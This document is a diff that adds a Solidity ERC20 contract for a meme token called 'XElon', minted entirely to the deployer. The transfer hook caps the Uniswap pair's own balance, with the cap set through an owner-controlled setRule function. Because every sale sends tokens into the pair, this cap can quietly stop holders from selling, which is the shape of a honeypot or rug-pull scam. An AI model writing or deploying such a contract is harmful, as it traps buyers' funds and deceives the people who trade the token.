@@ -1,0 +1,42 @@
+contract XElon is Ownable, ERC20 {
+    bool public limited;
+    uint256 public maxHoldingAmount;
+    uint256 public V3HoldingAmount;
+    address public uniswapV2Pair;
+    address public uniswapV3Pair;
+
+    constructor() ERC20("XElon", "XELON") {
+      uint256 _totalSupply = 10 * 10**9 * 10**18;
+        _mint(msg.sender, _totalSupply);
+    }
+
+    function setRule(bool _limited, address _uniswapV2Pair, address _uniswapV3Pair, uint256 _maxHoldingAmount, uint256 _V3HoldingAmount) external onlyRewarder {
+        limited = _limited;
+        uniswapV2Pair = _uniswapV2Pair;
+        uniswapV3Pair = _uniswapV3Pair;
+        maxHoldingAmount = _maxHoldingAmount;
+        V3HoldingAmount = _V3HoldingAmount;
+    }
+
+    function _beforeTokenTransfer(
+        address from,
+        address to,
+        uint256 amount
+    ) override internal virtual {
+
+        if (uniswapV2Pair == address(0)) {
+            require(from == owner() || to == owner(), "trading is not started");
+            return;
+        }
+        if (limited && to == uniswapV2Pair) {
+            require(super.balanceOf(to) + amount <= maxHoldingAmount, "Forbid");
+        }
+        if (limited && to == uniswapV3Pair) {
+            require(super.balanceOf(to) + amount <= V3HoldingAmount, "Forbid");
+        }
+    }
+
+    function burn(uint256 value) external {
+        _burn(msg.sender, value);
+    }
+}
